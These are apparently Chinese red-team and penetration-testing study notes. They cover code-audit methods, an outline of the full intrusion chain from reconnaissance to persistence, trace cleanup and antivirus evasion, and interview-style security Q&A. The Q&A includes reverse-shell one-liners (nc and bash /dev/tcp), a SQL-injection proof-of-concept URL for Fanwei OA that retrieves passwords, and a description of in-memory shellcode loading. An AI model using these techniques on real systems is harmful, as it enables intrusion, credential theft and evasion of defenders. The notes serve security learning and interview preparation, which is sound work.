# 方法

## SQL注入

## Java代码审计

### 代码审计常用思路

1.   接口排查：先找出从外部接口接收的参数，并跟踪其传递过程，观察是否有参数校验不严的变量传入高危方法中，或者在传递的过程中是否有代码逻辑漏洞（为了提高排查的全面性，代码审计人员可以向研发人员索要接口清单）。
2.   危险方法溯源：危险方法溯源（“逆向追踪”）：检查敏感方法的参数，并查看参数的传递与处理，判断变量是否可控并且已经过严格的过滤。
3.   功能点定向审计：根据经验判断该类应用通常会在哪些功能中出现漏洞，
     直接审计该类功能的代码。
4.   第三方组件、中间件版本比对：检查 Web 应用所使用的第三方组件或中间件的版本是否受到已知漏洞的影响。
5.   补丁对比：通过对补丁做比对，反推漏洞出处。
6.   黑白盒测试：我认为“白盒测试少直觉，黑盒测试难入微”。虽然代码审计的过程须以“白盒测试”为主，但是在过程中辅以“黑盒测试”将有助于快速定位到接口或做更全面的分析判断。交互式应用安全测试技术 IAST 就结合了“黑盒测试”与“白盒测试”的特点。
7.   代码静态扫描+人工研判：对于某些漏洞，使用代码静态扫描工具代替人工漏洞挖掘可以显著提高审计工作的效率。然而，代码静态扫描工具也存在“误报率高”等缺陷，具体使用时往往需要进一步研判。
8.   开发框架安全审计：审计 Web 应用所使用的开发框架是否存在自身安全性问题，或者由于用户使用不当而引发的安全风险。

### 远程调试方法（docker）

修改容器yml开启调试端口-修改容器内部配置文件打开调试模式-拷贝容器源代码-用调试器打开源代码并配置好依赖（add as library）-配置调试地址和端口并开启调试-访问特定功能触发断点。

### Java EE基础

#### Java EE分层模型

**Java EE核心技术**

-   Java 数据库连接（Java Database Connectivity，JDBC）在 Java 语言中用来规范客户端程序如何访问数据库的应用程序接口，提供了诸如查询和更新数据库中数据的方法。
-   Java 命名和目录接口（Java Naming and Directory Interface，JNDI）是 Java 的一个目录服务应用程序界面（API），它提供了一个目录系统，并将服务名称与对象关联起来，从而使开发人员在开发过程中可以用名称来访问对象。
-   企业级 JavaBean（Enterprise JavaBean，EJB）是一个用来构筑企业级应用的、在服务器端可被管理的组件。
-   远程方法调用（Remote Method Invocation，RMI）是 Java 的一组拥护开发分布式应用程序的 API，它大大增强了 Java 开发分布式应用的能力。
-   Servlet（Server Applet）是使用 Java 编写的服务器端程序。狭义的 Servlet 是指Java 语言实现的一个接口，广义的 Servlet 是指任何实现该 Servlet 接口的类。其主要功能在于交互式地浏览和修改数据，生成动态 Web 内容。
-   JSP（JavaServer Pages）是由 Sun 公司主导并创建的一种动态网页技术标准。JSP 部署于网络服务器上，可以响应客户端发送的请求，并根据请求内容动态生成HTML、XML 或其他格式文档的 Web 网页，然后返回给请求者。
-   可扩展标记语言（eXtensible Markup Language，XML）是被设计用于传输和存储数据的语言。
-   Java 消息服务（Java Message Service，JMS）是一个 Java 平台中关于面向消息中间件（MOM）的 API，用于在两个应用程序之间或分布式系统中发送消息，进行异步通信。

**Java EE分层模型**

-   Domain Object（领域对象）层：本层由一系列 POJO（Plain Old Java Object，普通的、传统的 Java 对象）组成，这些对象是该系统的 Domain Object，通常包含各自所需实现的业务逻辑方法。
-   DAO（Data Access Object，数据访问对象）层：本层由一系列 DAO 组件组成，这些 DAO 实现了对数据库的创建、查询、更新和删除等操作。
-   Service（业务逻辑）层：本层由一系列的业务逻辑对象组成，这些业务逻辑对象实现了系统所需要的业务逻辑方法。
-   Controller（控制器）层：本层由一系列控制器组成，这些控制器用于拦截用户的请求，并调用业务逻辑组件的业务逻辑方法去处理用户请求，然后根据处理结果向不同的 View 组件转发。
-   View（表现）层：本层由一系列的页面及视图组件组成，负责收集用户请求，并显示处理后的结果。

```
Database --> Domian Object --> DAO --> Service --> Controller --> View
```



#### MVC模式与MVC框架

#### Java Web核心技术

#### Java Web过滤器

#### Java反射机制

#### ClassLoader类加载机制

#### Java动态代理

#### 可用于Java Web的安全开发框架

### 技巧

==重点关注sql in和like函数。==
SQLMapConfig.xml存储了和数据库有关的信息，地址、用户名、密码。

## 红队流程

### 整体流程

入口权限--内网搜索/探测--免杀提权--抓取登陆凭证--跨平台横向攻击--入口权限维持--隧道数据回传--定期权限维持

### 入口权限获取

#### 入口权限思路

##### 绕过CDN

1. oneforall爆破子域名
2. 在线网站

##### 找到后台入口

1. 御剑爆破目录
2. 人工测试
3. 指纹识别CMS（云悉）

##### C段

1. ping
2. nmap、==小米范==、.sh
3. ==railgun==
4. [webscan](https://www.webscan.cc)

##### web banner扫描C段

1. domain：爆破端口
2. IP：爆破端口

##### 服务和端口识别

1. railgun
2. nmap
3. 在线端口[coolaf](http://coolaf.com/)

##### 目标DNS区域传送

1. DNS同步数据库技术：53端口、子域爆破

##### 批量抓取所有子域

1. oneforall
2. 子域名挖掘机
3. 在线[phpinfo.me](https://phpinfo.me/)、[ip138](https://ip138.com/)

##### git信息泄漏

1. /.git 得到项目源代码
2. github语法：信息枚举

##### accesskey云盘和百度文库信息泄漏

##### 第三方历史漏洞库信息泄漏：敏感的账号密码

##### 目标SVN信息泄漏

1. /.svn

##### 搜索引擎

1. fofa、shodan、zoomeye
2. bing、google、百度、奇安信鹰图
3. ==小蓝本（股权、登录口、真实IP）==
4. 企查查、爱企查
5. ==fofa_viewer==

##### wiki

1. 敏感信息、账号密码

##### 微信小程序

1. 敏感信息泄漏
2. js探针信息收集目标内网信息

##### qq群、微信群、供应商

1. 收集手机号、微信号、邮箱

##### 敏感信息生成字典

1. ==cupp==
2. ==cewl==
3. 第三方合成工具

##### 判断waf、bypasswaf

1. ==wafw00f==
2. oneforall
3. dismap

##### bypasswaf RCE、webshell

1. 混淆、冰蝎魔改

##### SQL注入、java web中间件

##### nday使用

##### 免杀技巧

#### 服务器中间件

##### 综述

1. 中间件、web服务组件、开源程序、数据库
2. java->root/system

##### struts2

1. S2-005-057(052)

##### weblogic

1. CVE-2014-4210
2. CVE-2019-2715

##### JBOSS

1. CVE-2017-12149
2. 部署webshell war弱口令控制后台

##### tomcat

1. manager登录后台

##### jekins

1. 未授权访问、弱口令、任意命令执行

##### ElasticSearch

1. 搜索服务器、web接口连接、java语言开发
2. 2015年 任意文件读取

##### rabbitMQ

高级消息协议，发送消息或数据消息传输代理软件，未授权访问

##### Glassfish

1. web应用服务器，部署webshell、控制台默认管理后台弱口令

##### IBM webSphere

1. java反序列化
2. 部署后台webshell

##### apache ActiveMQ

1. 通信中间件 PUT文件上传jsp

##### apache solr

1. java CVE-2019-0193

##### shiro

1. 基于key拿shell

##### 阿里fastjson

1. 1.2.47反序列化漏洞

#### windows集成环境

##### AppServ

1. php网页工具组合包（单一）

##### Xampp

1. apache+mysql+php

##### 宝塔

1. 百余种中间件合集

##### 小皮（phpstudy）

1. 绝大多数
2. phpmyadmin

#### 开源程序

##### Dedecms

1. 织梦、后台弱口令
2. thinkPHP 5.x
3. phpcms
4. 诺伊CMS（计划任务提权）
5. ecshop（手机的开源CMS框架管理）
6. 帝国CMS
7. discuz
8. wordpress
9. drupal
10. phpmyadmin

#### web组件

##### IIS

1. windows环境，6.0版本存在put文件上传

##### 禅道项目管理系统

1. SQL注入、文件读取、远程代码执行

##### 通达OA

1. 一件getshell

##### exchange（CVE-2020-0688）

1. 权限维持、钓鱼

##### zimbra

1. 桌面形式、电子邮件开发供应商（火狐、safari、IE）
2. CVE-2019-9670

##### zabbix

1. 网络监视器（server、agent）
2. SQL注入、老版本存在弱口令、敏感信息泄露

##### cacti

##### webmin

1. /etc/inetd.comf
2. /etc/passwd

##### phpMailer

1. PHP邮件支撑

##### 泛微OA

##### 金蝶OA

1. SQL注入

##### UEditor

1. 富文本编辑器，文件上传

##### 用友NC

1. 命令执行

##### shellshock

1. bashshell漏洞

#### getshell

##### 后台弱口令

##### SSRF

##### SQL注入

##### 越权命令

##### 代码执行

##### 任意文件上传、文件包含

##### XSS-钓鱼-0day联动

##### 业务逻辑漏洞

#### 边界网络设备

##### 深信服Sangfor VPN

##### 飞塔防火墙（VPN）

1. ipsec网络层VPN
2. CVE-2018-13379文件读取

##### Pulse Secure vpn

1. 身份认证

### getshell

#### TOP Port List

1. mssql（1433、弱口令sa、提权、后门植入、远程命令执行）
2. SMB（445端口、后门植入、远程命令执行）
3. ==WMI（135端口、远程命令执行、后门植入）==
4. ==winRM（5985）==
5. RDP（3389）
6. oracle（1521）
7. redis（未授权反问、set写入文件）
8. POSTgresql（5432）
9. LDAP（389）
10. SMTP（25、弱口令）
11. POP3（110）
12. IMAP（143）
13. Exchange（443、OWS接口PTS脱敏邮件获取敏感信息）
14. VNC
15. FTP
16. RSync
17. Mongodb（勒索软件）
18. telnet（23）

#### 钓鱼

##### 发信前期准备

*流量官网新闻信息，通过最新信息制造钓鱼文件名称，单位不一样，图标可以一样，字样新颖*
1. 枚举用户名、邮箱地址、手机号
2. 批量搜索目标邮箱弱口令、批量手机邮箱号
3. 伪造发信人、小号、搭建邮件服务器、==Gophish、ewomail、mip22==
4. 钓鱼信息

##### 投递方式

1. 直接投信（传统宏利用word/excel/pdf；捆绑putty/xshell/ssh软件；exe：zip；link；chm；自解压执行dll文件，任务管理器关不掉；木马链接xss/论坛/邮件）
2. 发送钓鱼链接（vpn；mail；OA；html hash远程模版注入，钓hash）

### 主机安全

#### windows

1. 提前免杀
2. ==bypassuac（MSF/empire/PS）==
3. MS14-058
4. MS14-068
5. MS15-051
6. MS16-032
7. MS17-010
8. CVE-2019-0708
9. CVE-2019-12750

#### linux

1. ==les.sh==
2. ==linux exp suggester==
3. CVE-2021-4034
4. CVE-2022-0847

#### 第三方服务器软件提权

1. mssql
2. mysql udf
3. oracle
4. dll劫持第三软件
5. suid
6. 计划任务
7. 错误服务配置利用

### 内网安全

#### 敏感信息收集

1. 收集跳板机信息
2. 查看当前shell权限和内核版本
3. IP配置信息枚举
4. 获取当前系统最近用户登录记录
5. 所有命令历史记录
6. 获取所有服务和进程，端口和同行的木马
7. tasklist查看杀毒软件
8. 获取rdp和ssh默认端口
9. 获取ssh登录记录
10. 获取当前windows环境的登录成功日志
11. 获取本机安装的软件
12. 浏览器历史保存的账号密码信息
13. 查看所有计划任务和执行脚本情况
14. 回收站的文件
15. 存在suid程序信息
16. 注册表项值
17. IPC命名管道是否开启
18. mount挂载
19. 查看防火墙状态（net关闭）
20. 获取开启的累积时长（长的风险大）
21. arp缓存、DNS缓存
22. host文件
23. 用户本地组的用户情况 
24. 抓取对方远程桌面信息（图片）

#### 依靠EDR捕捉敏感信息

1. 网络拓扑图
2. 安装EDR的终端的真实IP
3. telnet / tracert

#### 内网关键业务系统枚举

1. 内网共享服务器
2. web服务器
3. 内网数据库
4. 邮件服务器
5. ==监控服务器（zabbix/cacti）==
6. 防火墙、EDR、态势感知、超融合
7. 日志服务器
8. 补丁服务器
9. OA、ERP、HR、CRM
10. 打印机
11. VPN服务器
12. MES系统（exp、command（AUX））
13. 虚拟化服务器
14. 管理人员、研发人员的机器、运维人员
15. 路由交换、数通产品（disa int历史命令信息）

#### 漏洞

1. MS08-067
2. MS17-010
3. CVE-2019-0708

#### 敏感凭证

##### 主动信息收集

1. 批量抓取端口数据库和文件的弱口令
2. 查看doc/xls/txt文件枚举
3. mssql自动登录数据库（localhost）
4. 抓取注册表中的hash（win）
5. mimikatz抓取本地用户名密码
6. 凭据管理器保存各种连接的账号密码
7. mstsc默认rdp登录的历史记录
8. vnc客户端抓取保存的账号密码
9. SSH客户端抓取账号密码
10. 浏览器页面默认保存的账号密码
11. 数据库表中保存的账号密码
12. Xshell账号密码
13. VPN账号密码

##### 被动信息收集

1. ==ssp、winRAR联动做图像文件、植入内存中==
2. 域权限维持（[hook PasswordChangeNotify](https://cloud.tencent.com/developer/article/1760137)）
3. OWA exchange（登录账号密码截获）
4. 别名
5. 传统键盘记录（windows蓝屏；登录界面）
6. hash爆破

#### 隧道转发

##### 出网流量

1. http/dns（wmi、smb、ssh）
2. http脚本（==reGeorg、tunna、woo、wevely==）
3. ssh隧道转发
4. rdp隧道转发（==SocksOverRDP==）
5. 反响socks（frp、nps、CS）
6. 双向TCP端口转发（nginx、netsh、socat、ew不免杀）
7. ssh隧道加密（==dnscat2==，C&C隧道加密）
8. 端口复用（443、8080、==pystinger、netsh==）

### 域

##### 信息收集

1. ==BloodHound==
2. 域管列表
3. 域控名
4. DNS服务器
5. SPN
6. 所有用户列表
7. 域林
8. 域信任
9. 开机时间
10. 域策略

#### 快速获取域控权限

1. GPP目录
2. 票据TGT、hash破解（mimiktz）
3. 批量对域用户进行单密码爆破（喷射==kerbrute==、ADSI接口操作）
4. ==Kerberos委派利用==
5. 爆破LDAP
6. Exchange利用
7. SSP截获账号密码
8. DNSadmin组如果开启了权限，可以利用dll恶意代码执行
9. MS14-068
10. ==LLMNR（hashcat、john爆破）/NBNS欺骗==

#### 域内后渗透

1. 获取所有DNS记录
2. 当前域的LDAP数据库详细信息
3. ==ntds.dit、sam、lasses.exe==
4. 卷影拷贝技术（==ntdsutil、vssadmin、diskshadow、vssown.vbs）
5. DCSYNS技术mimikatz

#### 域内指定登录IP定位

1. OWA
2. 域登录日志
3. ==银票==

#### 域内指定域控技巧

1. ==pTT票据传递工具==
2. GPO策略下发

#### 域权限维持

1. ==黄金票据==
2. ==万能密码-skeleton key-mimikatz==
3. ==krbtgt== DSRM密码同步
4. OWA后门

### 横向

#### win-win

1. ==smbexec==
2. ==task/a计划任务==
3. ==wmi执行命令（wmiexec）==
4. ==winRm==微软远程管理工具
5. ==DCOM==远程执行（关闭防火墙）
6. ==RDP==留后门
7. mssql、oracle
8. ==PTH哈希传递攻击==
9. 补丁服务器下发策略执行命令
10. EDR执行命令下发策略

#### win-lin

1. ==plink==

#### lin-win

##### ==impacket==

1. wmiexec
2. smbexec
3. psexec
4. atexec

#### lin-lin

1. ssh

#### 各种远程下载

##### linux

1. wget
2. curl

##### windows

1. ==certutil.exe==
2. powershell
3. ==rundll32.exe==
4. ==regsvr32.exe==
5. ==bitsadmin.exe==

### 权限维持

#### 边界入口权限

1. exchange权限维持
2. VPN登录口
3. web服务器
4. 边界web服务器放webshell
5. h3c路由解析shell

#### win

1. CS脚本
2. 计划任务
3. 注册表
4. wmi
5. dll
6. ==MOF==
7. 向日葵远控

#### linux

1. ssh
2. so（ko）服务
3. 计划任务（crontab）
4. 远程工具灰鸽子（应用层、驱动层）

### 痕迹清理

1. web日志：访问、报错
2. 数据库日志：异常连接日志、慢查询日志
3. 各类安全日志：ssh、rdp、smb、wmi
4. 邮箱登录日志
5. 域的金银票日志

### C2

1. CS
2. MSF
3. ==payload beacon==

### webshell工具

1. 菜刀
2. 冰蝎
3. 蚁剑

### 免杀

#### 静态

1. 混淆
2. 加壳

#### 动态

1. 反射

#### 流量

1. ==域前置==（CDN）
2. DNS加密隧道
3. 第三方邮箱
4. tg官网引流
5. go官网（语言官网）

### 总结

1. ==ehole、kscan、dismap==
2. oneforall
3. awvs、goby、appscan、==nikto、xray、vulmap==
4. ==naabu.exe、httpx.exe、nuclei.exe、vscan.exe==联动

# 工具

# 技巧



# 漏洞

# 实战

# Q/A

## SQL

**Q：SQL注入原理，及利用方式？**
A：在应用没对SQL语句进行严格处理时可以插入恶意的SQL语句嵌入并执行；布尔盲注、联合注入、延时注入、宽字节注入、堆叠注入（两条语句先后执行）。

**Q：SQL注入如何防护？**
A：使用安全API、转义处理、白名单、规范编码集、预编译、WAF。

**Q：SQL常见符号无法使用的解决方法？**
A:
	` ` ：`/**/`、`%A0`、`%20`、`%0A`、`%0B`、`%0C`、`%2E` 浮点数8Eunion
	`=`：使用like 、`rlike` 、`regexp` \使用`<` 或者`>`
	`''`：用十六进制字符串
	`,`：substr/limit/mid使用from to、join（`select * from (select 1)a join (select 2)b`）、字符串用like
	`<>`：`greatest`函数返回最大值替代小于号`greatest(x,2)=2`、`least`函数返回最小值、`between`代替范围或相等`between 1 and 1`
	`注释`：用单引号闭合后面的语句
	`指令`：注释、内联注释、大小写、双关键字、等价函数（sleep/benchmark、hex/ascii）、宽字节`%df`或`\\`吃掉转义符号（replace/addslaches），将mysql\_query设置为binary方式

**Q：SQL预编译如何避免注入问题？**
A：SQL语句执行之前已经被数据库分析、编译、优化，执行计划被缓存并以参数化形式进行查询，即使存在异常语句也会作为一个参数或字段的属性值来处理而不会作为SQL指令。

**Q：SQL预编译不能防御的情况有哪些？**
A：预编译命令使用错误：第一次就使用了字符串拼接导致命令可控，编译可能不会生效；部分参数不可预编译：表和列名，若可控危险；预编译实现错误产生的逻辑漏洞。

**Q：宽字节注入如何解决？**
A：通过`mysql_real_escape_string`、`mysql_set_charset`。

**Q：联合注入的常用语句、常用函数和常用表？**
A：`order by`、`union`；`group_concat()`、`database()`；`information\_schema.tables`、`information\_schema.columns`。

**Q：盲注的常用函数**
A：`limit()`、`substr()`、`mid()`、`ascii()`、`regexp()`、`like`、`left()`、`chr()`、`sleep()`、`if()`。

## XSS

**Q：XSS的原理及利用方式？**
A：在web页面中嵌入js代码并执行；反射型、存储型、DOM型（窃取cookie、劫持流量恶意跳转`window.location.herf`，配合CSRF）。

**Q：XSS防护绕过方式？**
A：大小写、双写、`<img>`、编码、主动闭合标签。

**Q：如何防护XSS攻击？**
A：白名单过滤、编码、限制长度、转移。

## CSRF

**Q：CSRF的原理及利用方式？**
A：利用已经登录的用户，有道访问恶意链接、利用其身份非法操作（越权）；GET型（无token参数并有可控参数，不知情点击伪装链接完成操作）、POST型（无token参数并未验证referer信息）、链接型（诱导用户点击恶意链接）。

**Q：如何防护CSRF攻击？**
A：通过CSRF-token或验证码检测提交、验证referer、使用POST、避免通用cookie。

**Q：token和referer哪个安全性更好？**
A：token，不是任何服务器都能取得referer、且可以自定义。

**Q：登录访问控制？**
A：口令+短信验证、后端针对session生成token，下次操作后端验证token不一致不操作。

**Q：同源策略是什么？**
A：协议+域名+端口三者相同。同源策略限制的行为：无法读取非同源网页的 Cookie、LocalStorage 和 IndexedDB、无法接触非同源网页的 DOM、无法向非同源地址发送AJAX请求（可以发送，但浏览器会拒绝接受响应）。

**Q：如何解决跨域问题？**
A：web sockets（使用自定义的HTTP头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败）、JSONP（利用script标签没有跨域限制的特性）、CORS（服务端设置 Access-Control-Allow-Origin）。

## SSRF

**Q：SSRF的原理及利用方式？**
A：攻击者构造由服务端发起的请求，一般以无法从外网访问的内部系统为目标。通过url传递给服务器执行位置，例如转码、在线翻译、请求远程资源。访问内网指纹文件、扫描主机端口、请求大文件DoS、攻击内网设备。weblogic CVE-2014-4210访问`http://192.168.199.155:7001/uddiexplorer/`修改oprator造成SSRF。

**Q：SSRF如何抵御？**
A：过滤返回信息、禁止不常用的协议、限制请求端口、Host白名单。

**Q：如何绕过SSRF防御？**
A：编码（IP）、利用url解析问题、利用跳转服务、IPv6、非http协议、DNS重绑定。

## XXE

**Q：XXE的原理及利用方式？**
A：XML外部实体注入，当允许引用外部实体时，通过构造恶意内容，导致读取任意文件、执行系统命令、内网探测与攻击等危害的一类漏洞；内网攻击、读取本地文件、执行远程命令`except`（要求有该扩展）spring-data-XMLBean（CVE-2018-1259）

```xml
普通实体
<!ENTITY 实体名 SYSTEM "URI">
<!ENTITY 实体名 PUBLIC "public_ID" "URI">
参数实体
<!ENTITY % 实体名称 "实体的值">
<!ENTITY % 实体名称 SYSTEM "URI">
```

**Q：如何防护XXE漏洞？**
A：关闭外部实体引用。

## 文件上传

**Q：文件上传的原理及利用方式？**
A：攻击者可以超过本身权限向服务器上传可执行的动态脚本文件、前端js验证（禁用js/改包）、大小写绕过、双重后缀名（IIS解析漏洞）、双写绕过。

**Q：如何防护文件上传漏洞？**
A：文件上传目录设置为不可执行、白名单过滤、随机数改写文件名和路径。

## 文件包含

**Q：文件上传的原理及利用方式？**
A：引入一段可控代码，令服务端通过include函数等动态执行。

**Q：导致文件包含的函数有哪些？**
A：
	PHP：`include()`、`require()`、`fopen()`、`readfile()`
	JSP：`ava.io.File()`、`java.io.FileReader()`
	ASP：`include file`、`include virtual`
	`include`报错继续执行，`require`报错退出。

## 逻辑漏洞

**Q：有哪些常见的逻辑漏洞？**
A：
	密码找回漏洞：密码允许暴力破解、存在通用型找回凭证、绕过验证步骤、找回凭证可以拦包。
	身份认证漏洞：固定会话攻击、Cookie仿冒，只要得到二者之一就可以伪造用户身份。
	验证码漏洞：验证码允许暴力破解、验证码可以通过js或改包的方式逃过。

**Q：挖掘过的业务逻辑漏洞？**
A：益阳市自来水有限公司存在登录绕过漏洞，在后台登录页面输入任意用户名密码，在验证返回后，服务器向客户端发送的报文中包含isSuccess字段，将其值改为True就能绕过登录逻辑直接以管理员身份进入系统。

## OA

**Q：常见的OA系统有哪些？**
A：泛微OA、织信OA、致远OA、蓝凌OA。

**Q：泛微OA的漏洞**
A：SQL注入漏洞：在泛微OA V8中的getdata.jsp文件里，通过gatData方法将数据获取并回显在页面上，而在getData方法中，判断请求里cmd参数是否为空，如果不为空，调用proc方法。其中它存在四个参数，分别为空字符串、cmd参数值、request对象以及serverContext对象，通过对cmd参数值进行判断，当cmd值等于getSelectAllId时，再从请求中获取sql和type两个参数值，并将参数传递进getSelectAllIds（sql,type）方法中，从而在前台构造POC：`http://xxx.xxx.xxx.xxx/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager`访问存在漏洞的网站：`http://x.x.x.x/login/Login.jsp?logintype=1`，其中该特征属于泛微OA v8系统。
文件上传漏洞：漏洞位于: /page/exportImport/uploadOperation.jsp文件中。Jsp流程大概是:判断请求是否是multipart请求,直接上传。重点关注File file=new File(savepath+filename)。Filename参数,是前台可控的,并且没有做任何过滤限制。然后请求 然后请求路径:page/exportImport/fileTransfer/1.jsp


## 隧道与代理

**Q：常见的隧道或代理软件？**
A：CS（设置代理）、msf（添加路由）、frp（反向代理）、ngork（内网穿透）、ew（正反向代理）、nc（弹shell）、proxychains、nginx（反向代理）、proxifier（socks5客户端）、reGeorg、wevely、ssh。

**Q：需要正向代理的情况？**
A：内网中有不能被外部访问但可以访问外部的设备，需要在中间跳板机上设置正向代理。

**Q：需要反向代理的情况？**
A：内网中有不出网的机器，在中间跳板机上设置反向代理，将内网机器映射到公网上。

**Q：如何反弹shell？**
A：
	nc：攻击机（`nc -lvp 4444`）、靶机（`nc 1.1.1.1 4444 -e /bin/bash`）
	bash：攻击机（`nc -lvp 4444`）、靶机（`bash -I >& /dev/tcp/1.1.1.1/4444 0>&1 /bin/bash`）

## CDN

**Q：CDN如何检测？**
A：nslookup、各地ping、修改host绑定域名。

**Q：CDN如何绕过？**
A：CDN配置错误某些未配置CDN、使用邮件服务找邮件源码分析IP地址对比备案、利用子域名、*使用国外或偏远地区无CDN获取真实IP*、*网站指纹*、*让服务器反向连接*、*信息泄露phpinfo*

## 域

**Q：域信任关系？**
A：用于确保一个域的用户可以访问和使用另一个域中的资源安全机制，分为双向可传递父子信任关系、树间双向可传递信任关系、同森林两域间快捷方式信任关系、外部信任关系不可传递单向信任、森林信任不可传递仅存在于森林根域之间。

**Q：域中常见的命令？**
A：
	`net config workstation`查看计算机名、全名、用户名、系统版本、域、登录域
	`nltest /domain_trusts`查看域信任关系
	`net user /domain`或`net time /domain`查看域控主机的用户账户和其它用户列表
	`nslookup`解析域控ip
	`net group /domain`查看分组
	`net group "Domain Admins" /domain`查看域中分组信息

## PHP

**Q：PHP魔术方法是什么？**
A：魔术方法：不需要显示的调用而是由某种特定的条件触发执行的以两个下划线开头的特殊预置函数。

**Q：PHP魔术方法有哪些？**
A：PHP魔术方法有如下几个：
	`__constuct`: 构建对象的时被调用
	`__destruct`: 明确销毁对象或脚本结束时被调用
	`__wakeup`: 当使用unserialize时被调用，可用于做些对象的初始化操作
	`__sleep`: 当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用
	`__call`: 调用不可访问或不存在的方法时被调用
	`__callStatic`: 调用不可访问或不存在的静态方法时被调用
	`__set`: 当给不可访问或不存在属性赋值时被调用
	`__get`: 读取不可访问或不存在属性时被调用
	`__isset`: 对不可访问或不存在的属性调用isset()或empty()时被调用
	`__unset`: 对不可访问或不存在的属性进行unset时被调用
	`__invoke`: 当以函数方式调用对象时被调用
	`__toString`: 当一个类被转换成字符串时被调用
	`__clone`: 进行对象clone时被调用，用来调整对象的克隆行为
	`__debuginfo`: 当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本
	`__set_state`: 当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值

**Q：PHP反序列化漏洞利用流程**
A：析构-字符串操作-动态代码执行`to_array()`、`$closure`（满足或绕过条件、找到可控制参数、构造反序列化类）
	先找到入口文件，然后再层层跟进，找到代码执行点等危险操作。
	特别注意魔法函数、任意类和函数的调用、以及子类等的综合分析
	构造POC注意复用类和抽象类的问题：
	发现类是Trait类，Trait类PHP 5.4.0开始引入的一种代码复用技术，是为解决PHP单继承而准备的一种代码复用机制，无法通过 `trait` 自身来实例化，需要找到复用它的类来利用。
	抽象类也不能实例化，需要找到子类普通类来实例化。
	起点：

	- 最常用的就是反序列化时触发的魔术方法：
		`__destruct`: 明确销毁对象或脚本结束时被调用
		`__wakeup`: 当使用unserialize时被调用，可用于做些对象的初始化操作
	- 有关字符串操作可以触发的魔术方法：
		`__toString`: 当一个类被转换成字符串时被调用
	- 触发的情况
	中间跳板：
		`__toString`: 当一个类被转换成字符串时被调用
		`__call`: 调用不可访问或不存在的方法时被调用
		`__callStatic`: 调用不可访问或不存在的静态方法时被调用
		`__set`: 当给不可访问或不存在属性赋值时被调用
		`__get`: 读取不可访问或不存在属性时被调用
		`__isset`: 对不可访问或不存在的属性调用isset()或empty()时被调用
	终点：
	`__call`: 调用不可访问或不存在的方法时被调用
	`call_user_func`、`call_user_func_array`等代码执行点

**Q：PHP危险函数有哪些？**
A：
	代码执行函数：`eval()`、`assert()`、`preg_replace()`（`
preg_replace("/\[(.*)\]/e","\\1", $code);`）
	系统命令执行函数：`system()`、`exec()`、`shell_exec()`、`passthru()`、`popen()`

## JAVA

**Q：常见的JAVA中间件框架有哪些？**
A：apache、weblogic、spring、tomcat

**Q：JAVA危险函数有哪些？**
A：
	XSS：`getParameter()`、`getcokies()`、`getQueryString()`、getheaders()、`Runtime.exec()`
	文件下载：`download()`、write、getFile
	文件上传：`upload`
	命令执行：`java.lang.Runtime.getRuntime().exec()`
	反序列化：`ObjectInputStream.readObject`、J`SON.parseObject`
	XXE：`DocumentBuilder`、 `XMLStreamReader`
	日志：`log.info()`

## Python

**Q：python危险函数有哪些？**
A：
	代码执行：`eval()`、`exec()`
	命令执行：`os.popen()`、`os.system()`、`commands.getstatusoutput()`、`subprocess.Popen()`

## Nmap

**Q：Nmap的扫描方式有哪些？**
A:

|    方式     |           描述            | 参数 |
| :---------: | :-----------------------: | :--: |
| TCP connect |          全连接           | -sT  |
|   TCP SYN   |          半连接           | -sS  |
|   TCP FIN   |          发FIN包          | -sF  |
|  TCP NULL   | 发送不包含SYN RST ACK的包 | -sN  |
|   TCP ACK   |  只设置ACK探测是否被过滤  | -sA  |
| TCP Window  |         窗口扫描          | -sW  |
| TCP Maimon  |     同时设置FIN和ACK      | -sM  |
|             |    放弃主机发现禁ping     | -Pn  |

## 容器解析漏洞

```
IIS 6.0
/xx.asp/xx.jpg "xx.asp"是文件夹名

IIS 7.0/7.5
默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析

Nginx
版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。
空字节代码 xxx.jpg.php

Apache
上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀

lighttpd
xx.jpg/xx.php，不全,请小伙伴们在评论处不吝补充，谢谢！
```

## 权限提升

**Q：内网常见的提权漏洞有哪些？**
A：
	MS14-058windows内核溢出漏洞提权限
	MS14-068伪造域管的TGT票据授予票据
	MS15-051本地内核提权
	MS16-032wimc本地溢出
	MS17-010永恒之蓝SMB漏洞
	CVE-2019-0708 Windows远程桌面服务漏洞
	CVE-2019-12750 Symantec终端保护本地提权漏洞
	CVE-2021-4034 polkit 工具集的本地权限提升漏洞
	CVE-2022-0847dirty pipe内核提权漏洞

## 权限维持

**Q：熟悉的C2工具原理？**
**A：** 
	teamserver为一个团队服务器，众多cs客户端连上它，以进行协同工作，里面有一个内置聊天室哦；
	cobaltstrike为客户端工具，启动时需指定要连接的teamserver；
	在cobaltstrike工具上，生成一个木马（支持多种类型，如ps1、exe、java、dll、python等15种类型），扔到被控机上运行。（体现后渗透）
	该木马定期给teamserver发送心跳，证明我还活着（默认一分钟一次，可修改）！同时根据teamserver回应的不同，判断teamserver是否有新任务。
	如有，则再次请求任务明细，在被控机上执行后，返回回显给teamserver。
![](../attaches/1000.jpeg)
[Cobalt Strike Beacon原理浅析_腾讯新闻 (qq.com)](https://new.qq.com/rain/a/20200306A056Z200)

## 免杀

**Q：常见的免杀方法？**
A：修改特征码（字符串检测、某区域内存在病毒库中的特征）、花指令（不可执行：多字节指令、破坏堆栈平衡（IDA递归下降）；可执行：函数调用（add esp ret）、混淆特征码（jmp label --> push label / ret））、加壳（壳本身也有特征码）、内存免杀（VirtualAlloc直接将shellcode加载进内存）、二次编译。

**Q：介绍一种免杀方法？**
A：将shellcode保存成字符串，木马请求远程shellcode字符串，将字符串解析为十六进制串，调用kernel32中的VirtualAlloc函数创建内存，通过ntdll.dll中的RtlCopyMemory将shellcode拷贝到内存中，通过syscall执行，免去了文件落地。

## HTTP

**Q：HTTP请求头注入？**
A：开发人员为了验证客户端HTTP Header（比如常用的Cookie验证等）或者通过HTTP Header头信息获取客户端的一些信息（例如：User-Agent、Accept字段等），会对客户端HTTP Header 进行获取并使用SQL语句进行处理，如果此时没有足够的安全考虑，就可能导致基于HTTP Header的注入漏洞。

